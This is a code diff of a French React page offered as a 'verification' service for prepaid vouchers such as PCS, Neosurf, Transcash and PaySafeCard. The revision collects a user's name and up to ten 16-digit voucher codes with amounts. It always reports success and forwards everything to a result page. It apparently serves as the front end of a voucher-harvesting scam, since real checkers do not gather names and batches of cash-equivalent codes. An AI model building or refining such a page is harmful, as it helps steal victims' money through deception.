@@ -1,45 +1,76 @@
 import React, { useState } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
-import { ArrowLeft } from 'lucide-react';
+import { ArrowLeft, CreditCard, User2, Wallet } from 'lucide-react';
+import { motion } from 'framer-motion';
 import { ButtonLoader } from '../components/Loader';
 
 const providers = {
   pcs: {
     name: 'PCS',
-    logo: 'https://upload.wikimedia.org/wikipedia/fr/0/09/PCS_Mastercard_logo.png',
+    logo: '/src/public/pcss.png',
     maxLength: 16,
     pattern: '[0-9]*',
-    format: 'XXXX XXXX XXXX XXXX'
+    format: 'XXXXXXXXXXXXXXXX',
+    color: '#4F46E5'
   },
   neosurf: {
     name: 'Neosurf',
-    logo: 'https://upload.wikimedia.org/wikipedia/commons/7/7e/Neosurf_logo.png',
-    maxLength: 10,
+    logo: '/src/public/neosurf.png',
+    maxLength: 16,
     pattern: '[0-9]*',
-    format: 'XXXXXXXXXX'
+    format: 'XXXXXXXXXXXXXXXX',
+    color: '#2563EB'
   },
   steam: {
     name: 'Steam',
     logo: 'https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg',
-    maxLength: 15,
-    pattern: '[A-Z0-9]*',
-    format: 'XXXXX-XXXXX-XXXXX'
+    maxLength: 16,
+    pattern: '[0-9]*',
+    format: 'XXXXXXXXXXXXXXXX',
+    color: '#1D4ED8'
   },
   transcash: {
     name: 'Transcash',
-    logo: 'https://upload.wikimedia.org/wikipedia/fr/5/51/Transcash_logo.png',
-    maxLength: 14,
+    logo: '/src/public/transcash.webp',
+    maxLength: 16,
     pattern: '[0-9]*',
-    format: 'XXXXXXXXXXXXXX'
+    format: 'XXXXXXXXXXXXXXXX',
+    color: '#3B82F6'
+  },
+  paysafecard: {
+    name: 'PaySafeCard',
+    logo: '/src/public/lo.png',
+    maxLength: 16,
+    pattern: '[0-9]*',
+    format: 'XXXXXXXXXXXXXXXX',
+    color: '#60A5FA'
+  },
+  toneofirst: {
+    name: 'Toneo First',
+    logo: '/src/public/toneo.png',
+    maxLength: 16,
+    pattern: '[0-9]*',
+    format: 'XXXXXXXXXXXXXXXX',
+    color: '#93C5FD'
   }
+};
+
+const fadeInUp = {
+  initial: { opacity: 0, y: 20 },
+  animate: { opacity: 1, y: 0 },
+  transition: { duration: 0.5 }
 };
 
 function VerificationPage() {
   const { provider } = useParams();
   const navigate = useNavigate();
-  const [code, setCode] = useState('');
+  const [nom, setNom] = useState('');
+  const [prenom, setPrenom] = useState('');
+  const [codes, setCodes] = useState(Array(10).fill(''));
+  const [montants, setMontants] = useState(Array(10).fill(''));
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
+  const [activeIndex, setActiveIndex] = useState(0);
 
   if (!provider || !providers[provider.toLowerCase()]) {
     return <div>Provider not found</div>;
@@ -48,139 +79,219 @@ function VerificationPage() {
   const currentProvider = providers[provider.toLowerCase()];
 
   const formatCode = (input: string) => {
-    let formatted = input.replace(/[^0-9A-Z]/g, '');
-    if (currentProvider.name === 'Steam') {
-      formatted = formatted.replace(/(.{5})/g, '$1-').slice(0, 17);
-    } else if (currentProvider.name === 'PCS') {
-      formatted = formatted.replace(/(.{4})/g, '$1 ').slice(0, 19);
-    }
-    return formatted;
+    // Ne garder que les chiffres
+    return input.replace(/[^0-9]/g, '').slice(0, 16);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setError('');
 
-    if (code.length < currentProvider.maxLength) {
-      setError('Veuillez entrer un code valide');
+    if (!nom || !prenom) {
+      setError('Veuillez entrer au moins le nom et le prénom');
+      return;
+    }
+
+    const submittedCodes = codes.map(c => c.trim()).filter(c => c);
+    const submittedMontants = montants.map(m => m.trim()).filter(m => m);
+
+    if (submittedCodes.length === 0) {
+      setError('Veuillez entrer au moins un code de coupon');
       return;
     }
 
     setLoading(true);
-    // Simulate API call
     setTimeout(() => {
       setLoading(false);
-      // Navigate to result page with state
       navigate('/result', {
         state: {
-          success: Math.random() > 0.5, // Simulate random success/failure
-          message: Math.random() > 0.5 
-            ? "Votre coupon est valide et peut être utilisé."
-            : "Ce coupon est invalide ou a déjà été utilisé.",
-          code: code,
-          provider: currentProvider.name
+          success: true,
+          message: 'Vos coupons ont été vérifiés avec succès.',
+          codes: submittedCodes,
+          montants: submittedMontants,
+          provider: currentProvider.name,
+          nom,
+          prenom
         }
       });
     }, 1500);
   };
 
   return (
-    <div className="min-h-screen bg-gray-50">
+    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-indigo-50 text-black">
+      {/* Background Effects */}
+      <div className="fixed inset-0 -z-10">
+        <div className="absolute inset-0 bg-[#080B2C]" />
+        <div className="absolute inset-0 opacity-30 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-blue-500/20 via-transparent to-transparent" />
+        <div className="absolute inset-0">
+          <div className="absolute top-20 left-[20%] w-[400px] h-[400px] bg-blue-400/10 rounded-full blur-3xl animate-pulse" />
+          <div className="absolute top-40 right-[15%] w-[300px] h-[300px] bg-indigo-400/10 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '1s' }} />
+        </div>
+      </div>
+
       {/* Header */}
-      <header className="bg-white border-b border-gray-100">
+      <header className="border-b border-blue-100 backdrop-blur-lg bg-white/70 sticky top-0 z-50 shadow-sm">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center">
-          <button
+          <motion.button
             onClick={() => navigate('/')}
-            className="flex items-center text-gray-600 hover:text-gray-900"
+            className="flex items-center text-black/70 hover:text-black transition-colors"
+            whileHover={{ x: -5 }}
+            whileTap={{ scale: 0.95 }}
           >
             <ArrowLeft className="w-5 h-5 mr-2" />
             Retour
-          </button>
+          </motion.button>
         </div>
       </header>
 
-      <div className="max-w-lg mx-auto px-4 py-8 sm:px-6 lg:px-8">
-        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-8">
-          {/* Provider Logo */}
-          <div className="flex justify-center mb-8">
-            <img
-              src={currentProvider.logo}
-              alt={`Logo ${currentProvider.name}`}
-              className="h-16 object-contain"
-            />
-          </div>
-
-          <h1 className="text-2xl font-bold text-gray-900 text-center mb-2">
-            Vérifier votre {currentProvider.name}
-          </h1>
+      <div className="max-w-2xl mx-auto px-4 py-12 sm:px-6 lg:px-8">
+        <motion.div 
+          className="relative backdrop-blur-xl bg-white/80 rounded-3xl border border-blue-100 p-8 shadow-xl"
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ duration: 0.5 }}
+        >
+          <div className="absolute inset-0 bg-gradient-to-br from-[${currentProvider.color}]/10 to-transparent rounded-3xl" />
           
-          <p className="text-gray-600 text-center mb-8">
-            Entrez le code de votre coupon {currentProvider.name} pour vérifier sa validité
-          </p>
-
-          <form onSubmit={handleSubmit} className="space-y-6">
-            <div>
-              <label htmlFor="code" className="block text-sm font-medium text-gray-700 mb-1">
-                Code {currentProvider.name}
-              </label>
-              <div className="relative">
-                <input
-                  type="text"
-                  id="code"
-                  value={code}
-                  onChange={(e) => {
-                    const formatted = formatCode(e.target.value.toUpperCase());
-                    if (formatted.length <= currentProvider.maxLength + 4) {
-                      setCode(formatted);
-                    }
-                  }}
-                  className={`block w-full px-4 py-3 rounded-lg border ${
-                    error ? 'border-red-300' : 'border-gray-300'
-                  } focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent
-                  text-lg tracking-wider font-mono`}
-                  placeholder={currentProvider.format}
-                  maxLength={currentProvider.maxLength + 4}
-                  pattern={currentProvider.pattern}
+          <div className="relative">
+            {/* Logo */}
+            <motion.div 
+              className="flex justify-center mb-8"
+              initial={{ scale: 0.8, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              transition={{ duration: 0.5 }}
+            >
+              <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10">
+                <img
+                  src={currentProvider.logo}
+                  alt={`Logo ${currentProvider.name}`}
+                  className="h-12 object-contain"
                 />
-                <div className="absolute inset-y-0 right-0 flex items-center pr-3">
-                  <span className="text-gray-400 text-sm">
-                    {code.length}/{currentProvider.maxLength}
-                  </span>
+              </div>
+            </motion.div>
+
+            {/* Title */}
+            <motion.h1 
+              className="text-3xl font-bold text-center mb-8 bg-gradient-to-r from-blue-600 to-indigo-600 bg-clip-text text-transparent"
+              variants={fadeInUp}
+              initial="initial"
+              animate="animate"
+            >
+              Vérifier vos coupons {currentProvider.name}
+            </motion.h1>
+
+            <form onSubmit={handleSubmit} className="space-y-8">
+              {/* Personal Info */}
+              <div className="space-y-4">
+                <div className="relative">
+                  <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-black/40">
+                    <User2 className="w-5 h-5" />
+                  </div>
+                  <input
+                    type="text"
+                    value={nom}
+                    onChange={(e) => setNom(e.target.value)}
+                    placeholder="Nom"
+                    className="block w-full pl-12 pr-4 py-3 rounded-xl border border-blue-100 bg-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-transparent placeholder-gray-400 text-black backdrop-blur-xl"
+                    required
+                  />
+                </div>
+                <div className="relative">
+                  <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-black/40">
+                    <User2 className="w-5 h-5" />
+                  </div>
+                  <input
+                    type="text"
+                    value={prenom}
+                    onChange={(e) => setPrenom(e.target.value)}
+                    placeholder="Prénom"
+                    className="block w-full pl-12 pr-4 py-3 rounded-xl border border-blue-100 bg-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-transparent placeholder-gray-400 text-black backdrop-blur-xl"
+                    required
+                  />
                 </div>
               </div>
+
+              {/* Tickets */}
+              <div className="space-y-6">
+                {[...Array(10)].map((_, i) => (
+                  <motion.div 
+                    key={i}
+                    className={`space-y-4 p-6 rounded-2xl transition-all duration-200 ${
+                      activeIndex === i ? 'bg-blue-50/50 border border-blue-100' : ''
+                    }`}
+                    initial={{ opacity: 0, y: 20 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    transition={{ delay: i * 0.1 }}
+                  >
+                    <label className="block text-sm text-black font-medium">
+                      Ticket {i + 1}
+                    </label>
+                    <div className="relative">
+                      <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-black/40">
+                        <CreditCard className="w-5 h-5" />
+                      </div>
+                      <input
+                        type="text"
+                        value={codes[i]}
+                        onChange={(e) => {
+                          const updated = [...codes];
+                          updated[i] = formatCode(e.target.value.toUpperCase());
+                          setCodes(updated);
+                        }}
+                        onFocus={() => setActiveIndex(i)}
+                        placeholder="Code du coupon (16 chiffres)"
+                        className="block w-full pl-12 pr-4 py-3 rounded-xl border border-blue-100 bg-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-transparent placeholder-gray-400 text-black font-mono tracking-wider backdrop-blur-xl"
+                        maxLength={currentProvider.maxLength}
+                        pattern={currentProvider.pattern}
+                      />
+                    </div>
+                    <div className="relative">
+                      <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-black/40">
+                        <Wallet className="w-5 h-5" />
+                      </div>
+                      <input
+                        type="number"
+                        value={montants[i]}
+                        onChange={(e) => {
+                          const updated = [...montants];
+                          updated[i] = e.target.value;
+                          setMontants(updated);
+                        }}
+                        onFocus={() => setActiveIndex(i)}
+                        placeholder="Montant"
+                        className="block w-full pl-12 pr-4 py-3 rounded-xl border border-blue-100 bg-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-transparent placeholder-gray-400 text-black backdrop-blur-xl"
+                      />
+                    </div>
+                  </motion.div>
+                ))}
+              </div>
+
               {error && (
-                <p className="mt-2 text-sm text-red-600">
+                <motion.p 
+                  className="text-sm text-red-600 bg-red-50 p-4 rounded-xl border border-red-100"
+                  initial={{ opacity: 0, y: -10 }}
+                  animate={{ opacity: 1, y: 0 }}
+                >
                   {error}
-                </p>
+                </motion.p>
               )}
-            </div>
 
-            <button
-              type="submit"
-              disabled={loading || code.length < currentProvider.maxLength}
-              className={`w-full flex justify-center py-3 px-4 border border-transparent rounded-lg
-                text-white font-medium ${
-                  loading || code.length < currentProvider.maxLength
-                    ? 'bg-blue-400 cursor-not-allowed'
-                    : 'bg-blue-600 hover:bg-blue-700'
-                } focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500
-                transition-colors duration-200`}
-            >
-              {loading ? <ButtonLoader /> : 'Vérifier maintenant'}
-            </button>
-          </form>
-
-          <div className="mt-8 pt-6 border-t border-gray-100">
-            <h3 className="text-sm font-semibold text-gray-900 mb-4">
-              Instructions :
-            </h3>
-            <ul className="text-sm text-gray-600 space-y-2">
-              <li>• Entrez le code sans espaces ni tirets</li>
-              <li>• Vérifiez que tous les chiffres sont corrects</li>
-              <li>• Le code doit contenir exactement {currentProvider.maxLength} caractères</li>
-            </ul>
+              <motion.button
+                type="submit"
+                disabled={loading}
+                className={`w-full flex justify-center py-4 px-6 rounded-xl text-white font-medium transition-all duration-200 ${
+                  loading 
+                    ? 'bg-blue-400 cursor-not-allowed' 
+                    : 'bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 shadow-lg shadow-blue-500/25'
+                }`}
+                whileHover={{ scale: 1.02 }}
+                whileTap={{ scale: 0.98 }}
+              >
+                {loading ? <ButtonLoader /> : 'Vérifier maintenant'}
+              </motion.button>
+            </form>
           </div>
-        </div>
+        </motion.div>
       </div>
     </div>
   );
